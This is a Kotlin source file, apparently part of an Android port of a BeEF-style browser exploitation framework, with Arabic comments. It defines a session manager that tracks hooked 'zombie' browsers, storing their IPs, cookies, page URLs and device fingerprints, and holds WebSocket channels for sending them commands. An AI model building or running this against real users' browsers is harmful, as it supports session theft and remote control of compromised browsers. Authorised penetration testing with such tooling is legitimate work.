/**
 * Session Manager - إدارة جلسات المتصفحات المُهيأة
 * =================================================
 */

package com.beef.engine.core

import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

/**
 * جلسة المتصفح (Zombie)
 */
data class ZombieSession(
    val sid: String,
    var ip: String = "unknown",
    var userAgent: String = "",
    var pageUrl: String = "",
    var cookies: String = "",
    var screen: String = "",
    var platform: String = "",
    var language: String = "",
    var plugins: String = "",
    var firstSeen: Long = System.currentTimeMillis(),
    var lastSeen: Long = System.currentTimeMillis(),
    var commandCount: Int = 0,
    var online: Boolean = true
) {
    // استخراج اسم المتصفح من User-Agent
    val browserName: String
        get() = when {
            userAgent.contains("Chrome") && !userAgent.contains("Edg") -> "Chrome"
            userAgent.contains("Firefox") -> "Firefox"
            userAgent.contains("Safari") && !userAgent.contains("Chrome") -> "Safari"
            userAgent.contains("Edg") -> "Edge"
            userAgent.contains("Opera") || userAgent.contains("OPR") -> "Opera"
            else -> "Unknown"
        }
    
    // استخراج نظام التشغيل
    val osName: String
        get() = when {
            userAgent.contains("Windows") -> "Windows"
            userAgent.contains("Mac OS") -> "macOS"
            userAgent.contains("Linux") && !userAgent.contains("Android") -> "Linux"
            userAgent.contains("Android") -> "Android"
            userAgent.contains("iPhone") || userAgent.contains("iPad") -> "iOS"
            else -> "Unknown"
        }
    
    // هل المتصفح موبايل؟
    val isMobile: Boolean
        get() = userAgent.contains("Mobile") || 
                userAgent.contains("Android") || 
                userAgent.contains("iPhone")
    
    // التحويل لـ JSON
    fun toJson(): JSONObject {
        return JSONObject().apply {
            put("sid", sid)
            put("ip", ip)
            put("userAgent", userAgent)
            put("browser", browserName)
            put("os", osName)
            put("mobile", isMobile)
            put("pageUrl", pageUrl)
            put("cookies", cookies)
            put("screen", screen)
            put("platform", platform)
            put("language", language)
            put("firstSeen", firstSeen)
            put("lastSeen", lastSeen)
            put("commandCount", commandCount)
            put("online", online)
        }
    }
}

/**
 * مدير الجلسات
 */
class SessionManager {
    
    private val sessions = ConcurrentHashMap<String, ZombieSession>()
    private val webSockets = ConcurrentHashMap<String, WebSocketConnection>()
    
    // مهلة اعتبار الجلسة غير متصلة (30 ثانية)
    private val offlineThreshold = 30_000L
    
    /**
     * الحصول على جلسة أو إنشاء جديدة
     */
    fun getOrCreate(sid: String): ZombieSession {
        return sessions.getOrPut(sid) { 
            ZombieSession(sid).also {
                android.util.Log.i("SessionManager", "New session: $sid")
            }
        }
    }
    
    /**
     * الحصول على جلسة موجودة
     */
    fun get(sid: String): ZombieSession? = sessions[sid]
    
    /**
     * حذف جلسة
     */
    fun remove(sid: String) {
        sessions.remove(sid)
        webSockets.remove(sid)
    }
    
    /**
     * الحصول على جميع الجلسات
     */
    fun getAll(): List<ZombieSession> {
        updateOnlineStatus()
        return sessions.values.toList()
    }
    
    /**
     * عدد الجلسات
     */
    fun count(): Int = sessions.size
    
    /**
     * عدد المتصلين حالياً
     */
    fun onlineCount(): Int {
        updateOnlineStatus()
        return sessions.values.count { it.online }
    }
    
    /**
     * تحديث حالة الاتصال
     */
    private fun updateOnlineStatus() {
        val now = System.currentTimeMillis()
        sessions.values.forEach { session ->
            session.online = (now - session.lastSeen) < offlineThreshold ||
                           webSockets.containsKey(session.sid)
        }
    }
    
    /**
     * إضافة اتصال WebSocket
     */
    fun addWebSocket(sid: String, connection: WebSocketConnection) {
        webSockets[sid] = connection
        get(sid)?.online = true
    }
    
    /**
     * حذف اتصال WebSocket
     */
    fun removeWebSocket(sid: String) {
        webSockets.remove(sid)
    }
    
    /**
     * الحصول على اتصال WebSocket
     */
    fun getWebSocket(sid: String): WebSocketConnection? = webSockets[sid]
    
    /**
     * التحويل لـ JSON
     */
    fun toJson(): String {
        updateOnlineStatus()
        return JSONArray(sessions.values.map { it.toJson() }).toString()
    }
    
    /**
     * مسح جميع الجلسات
     */
    fun clear() {
        sessions.clear()
        webSockets.values.forEach { it.close() }
        webSockets.clear()
    }
}
